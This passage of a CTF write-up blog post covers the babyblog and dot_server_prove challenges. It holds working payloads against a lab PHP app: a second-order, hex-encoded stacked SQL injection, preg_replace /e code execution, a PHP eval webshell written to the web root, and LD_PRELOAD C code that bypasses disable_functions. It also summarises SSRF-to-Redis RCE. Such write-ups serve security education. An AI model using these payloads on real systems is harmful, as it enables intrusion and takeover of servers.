	<span class=nv>$title</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;title&#39;</span><span class=p>]);</span>
	<span class=nv>$content</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>]);</span>
	<span class=nv>$sql</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;insert into article (userid,title,content) values (&#34;</span> <span class=o>.</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;, &#39;</span><span class=si>$title</span><span class=s2>&#39;,&#39;</span><span class=si>$content</span><span class=s2>&#39;);&#34;</span><span class=p>);</span>
	<span class=k>exit</span><span class=p>(</span><span class=s2>&#34;&lt;script&gt;alert(&#39;Posted successfully.&#39;);location.href=&#39;index.php&#39;;&lt;/script&gt;&#34;</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div><p>但是在上面未经任何处理又直接取出来会导致二次注入，例如第一次插入<code>'1</code>，经过<code>addlashes</code>转义，sql 语句变成</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>insert</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>article</span><span class=w> </span><span class=p>(</span><span class=n>userid</span><span class=p>,</span><span class=n>title</span><span class=p>,</span><span class=n>content</span><span class=p>)</span><span class=w> </span><span class=k>values</span><span class=w> </span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;\&#39;</span><span class=mi>1</span><span class=s1>&#39;,&#39;</span><span class=mi>1</span><span class=s1>&#39;);&#34;
</span></code></pre></div><p>但是插入数据库的内容是<code>'1</code>，取出来的时候也是<code>'1</code>，这就导致了注入。</p>
<p>所以我们可以利用这个点进行注入，update 我们的 isvip 字段就行</p>
<pre tabindex=0><code>';update users set isvip=1 where username='zedd';
</code></pre><p>接下来就是那个奇葩正则了：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nv>$filter</span> <span class=o>=</span> <span class=s2>&#34;benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?</span><span class=se>\\</span><span class=s2>(|</span><span class=se>\\</span><span class=s2>b(and|or)</span><span class=se>\\</span><span class=s2>b</span><span class=se>\\</span><span class=s2>s*?([</span><span class=se>\\</span><span class=s2>(</span><span class=se>\\</span><span class=s2>)&#39;</span><span class=se>\&#34;\\</span><span class=s2>d]+?=[</span><span class=se>\\</span><span class=s2>(</span><span class=se>\\</span><span class=s2>)&#39;</span><span class=se>\&#34;\\</span><span class=s2>d]+?|[</span><span class=se>\\</span><span class=s2>(</span><span class=se>\\</span><span class=s2>)&#39;</span><span class=se>\&#34;</span><span class=s2>a-zA-Z]+?=[</span><span class=se>\\</span><span class=s2>(</span><span class=se>\\</span><span class=s2>)&#39;</span><span class=se>\&#34;</span><span class=s2>a-zA-Z]+?|&gt;|&lt;|\s+?[</span><span class=se>\\</span><span class=s2>w]+?</span><span class=se>\\</span><span class=s2>s+?</span><span class=se>\\</span><span class=s2>bin</span><span class=se>\\</span><span class=s2>b</span><span class=se>\\</span><span class=s2>s*?\(|</span><span class=se>\\</span><span class=s2>blike</span><span class=se>\\</span><span class=s2>b</span><span class=se>\\</span><span class=s2>s+?[</span><span class=se>\&#34;</span><span class=s2>&#39;])|</span><span class=se>\\</span><span class=s2>/</span><span class=se>\\</span><span class=s2>*.*</span><span class=se>\\</span><span class=s2>*</span><span class=se>\\</span><span class=s2>/|&lt;</span><span class=se>\\</span><span class=s2>s*script</span><span class=se>\\</span><span class=s2>b|</span><span class=se>\\</span><span class=s2>bEXEC</span><span class=se>\\</span><span class=s2>b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|</span><span class=se>\&#34;</span><span class=s2>).*?(`|&#39;|</span><span class=se>\&#34;</span><span class=s2>)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|</span><span class=se>\&#34;</span><span class=s2>).*?(`|&#39;|</span><span class=se>\&#34;</span><span class=s2>)\s*)SET|INSERT</span><span class=se>\\</span><span class=s2>s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(</span><span class=se>\\</span><span class=s2>(.+</span><span class=se>\\</span><span class=s2>)|</span><span class=se>\\</span><span class=s2>s+?.+?</span><span class=se>\\</span><span class=s2>s+?|(`|&#39;|</span><span class=se>\&#34;</span><span class=s2>).*?(`|&#39;|</span><span class=se>\&#34;</span><span class=s2>)|(\+|-|~|!|@:=|&#34;</span> <span class=o>.</span> <span class=nx>urldecode</span><span class=p>(</span><span class=s1>&#39;%0B&#39;</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;).+?)FROM(</span><span class=se>\\</span><span class=s2>(.+</span><span class=se>\\</span><span class=s2>)|</span><span class=se>\\</span><span class=s2>s+?.+?|(`|&#39;|</span><span class=se>\&#34;</span><span class=s2>).*?(`|&#39;|</span><span class=se>\&#34;</span><span class=s2>))|(CREATE|ALTER|DROP|TRUNCATE)</span><span class=se>\\</span><span class=s2>s+(TABLE|DATABASE)&#34;</span><span class=p>;</span>
<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nv>$filter</span> <span class=o>.</span> <span class=s1>&#39;/is&#39;</span><span class=p>,</span> <span class=nv>$value</span><span class=p>)){</span>
  <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;&lt;script&gt;alert(&#39;Failure!Do not use sensitive words.&#39;);location.href=&#39;index.php&#39;;&lt;/script&gt;&#34;</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div><p>看起来虽然过滤了很多，但是我们依然可以使用堆叠注入来绕过：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>set</span><span class=w> </span><span class=o>@</span><span class=n>t</span><span class=o>=</span><span class=mi>0</span><span class=n>x73656c65637420312c323b</span><span class=p>;</span><span class=k>prepare</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=o>@</span><span class=n>t</span><span class=p>;</span><span class=k>execute</span><span class=w> </span><span class=n>x</span><span class=p>;</span><span class=w>
</span></code></pre></div><p>所以我们把上面的 sql 语句换成16进制，就行了</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=s1>&#39;;set @t=0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d277a656464273b;prepare x from @t;execute x;
</span></code></pre></div><p>成为 vip 之后看到 replace.php 当中的内容：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nv>$content</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nx>preg_replace</span><span class=p>(</span><span class=s2>&#34;/&#34;</span> <span class=o>.</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;find&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;replace&#39;</span><span class=p>],</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>]));</span>
</code></pre></div><p>比较明显的一个利用 php 正则<code>/e</code>执行命令的写法，可以使用<code>%00</code>截断最后的一个斜杠，在<code>$_POST['find']</code>中使用<code>/e</code>修饰符</p>
<pre tabindex=0><code>find=/e%00&amp;replace=phpinfo();&amp;regex=1&amp;id=2
</code></pre><p>POST 之后拿到 phpinfo 信息，Web 根目录 <code>/var/www/html</code>， disable_functions :</p>
<pre tabindex=0><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,ini_set,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail
</code></pre><p>还有<code>putenv</code>，考烂了的 LD_PRELOAD 绕过，直接写个 webshell :</p>
<pre tabindex=0><code>find=/e%00&amp;replace=file_put_contents('/var/www/html/webshell.php','&lt;?php eval($_POST[a]);');&amp;regex=1&amp;id=2
</code></pre><p>发现还有 basedir 的限制，可以用以下列目录</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>if</span> <span class=p>(</span><span class=nv>$dh</span> <span class=o>=</span> <span class=nx>opendir</span><span class=p>(</span><span class=s2>&#34;glob:///*&#34;</span><span class=p>))</span> <span class=p>{</span>
	<span class=k>while</span> <span class=p>((</span><span class=nv>$file</span> <span class=o>=</span> <span class=nx>readdir</span><span class=p>(</span><span class=nv>$dh</span><span class=p>))</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
		<span class=k>echo</span> <span class=s2>&#34;</span><span class=si>$file\n</span><span class=s2>&#34;</span><span class=p>;</span>
	<span class=p>}</span>
	<span class=nx>closedir</span><span class=p>(</span><span class=nv>$dh</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div><p>在根目录有<code>/readflag</code>，直接写一个 so 文件就行了</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#define  _GNU_SOURCE
</span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>void</span> <span class=nf>pwn</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
	<span class=n>system</span><span class=p>(</span><span class=s>&#34;/readflag &gt; /var/www/html/res 2&gt;&amp;1&#34;</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>void</span> <span class=nf>getpid</span><span class=p>(){</span>
  <span class=n>unsetenv</span><span class=p>(</span><span class=s>&#34;LD_PRELOAD&#34;</span><span class=p>);</span>
  <span class=n>pwn</span><span class=p>();</span>
<span class=p>}</span>
</code></pre></div><p>在当前 web 目录拿到 flag。//因为是复现环境就无所谓了。</p>
<h2 id=dot_server_prove>dot_server_prove</h2>
<p>这个题比赛的时候没怎么看，看了 <a class=link href=https://xz.aliyun.com/t/6312 target=_blank rel=noopener>bytesCTF dot_server_prove WriteUP</a>，简单总结一下涉及的知识点：</p>
<ul>
<li>逆向 bin 文件查看逻辑，根据 host 来访问不同的站点，就像 apache 的 virtualhost 一样，读取 log 来保存你的 ua</li>
<li>在 ua 处进行 xss ，读取页面有 ssrf</li>
<li>ssrf 打 dict://172.18.0.3:6379/info 得到 redis 版本号 4.x</li>
<li>通过 gopher 利用主从复制的进行 RCE</li>
</ul>
<h2 id=icloudmusic>iCloudMusic</h2>
<p>打算与 SUCTF 的 iCloudMusic 放一起写吧</p>
<h1 id=conclusion>Conclusion</h1>
<p>题目都不算特别难，除了马师傅的 iCloudMusic 跟 dot_server_prove ，两个不是很摸得着头脑的题， Web1/2/3 都有点魔改凑题的嫌疑，这几题并没有特别亮眼的知识点，都属于考过的，后面两题还是比较有意思的，dot_server_prove 可能不是很 get 到点，毕竟也属于一个比较新颖的题目了，以及马师傅的 iCloudMusic ，毕竟也是专门研究了一个多月的 electron orz&mldr;还是有一点收获的，希望线下赛不会被打爆 orz&mldr;</p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/CTF/>CTF</a>
<a href=/tags/sql%E6%B3%A8%E5%85%A5/>sql注入</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2019/03/11/XSS-and-MYSQL-FILE/>
<div class=article-details>
<h2 class=article-title>XSS and MYSQL FILE</h2>
</div>
</a>
</article>
<article>
<a href=/2021/08/02/cybrics-checkin-2021/>
<div class=article-details>
<h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2>
</div>
</a>
</article>
<article>
<a href=/2021/07/21/google-qual-2021/>
<div class=article-details>
<h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2>
</div>
</a>
</article>
<article>
<a href=/2021/05/19/tls-ctf/>
<div class=article-details>
<h2 class=article-title>TLS-Poison 攻击方式在 CTF 中的利用实践</h2>
</div>
</a>
</article>
<article>
<a href=/2020/10/15/Defcon28final/>
<div class=article-details>
<h2 class=article-title>DEFCON 28 Final 杂记</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2021 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#boring_code>boring_code</a></li>
<li><a href=#ezcms>EzCMS</a></li>
<li><a href=#rss>rss</a></li>
<li><a href=#babyblog>babyblog</a></li>
<li><a href=#dot_server_prove>dot_server_prove</a></li>
<li><a href=#icloudmusic>iCloudMusic</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>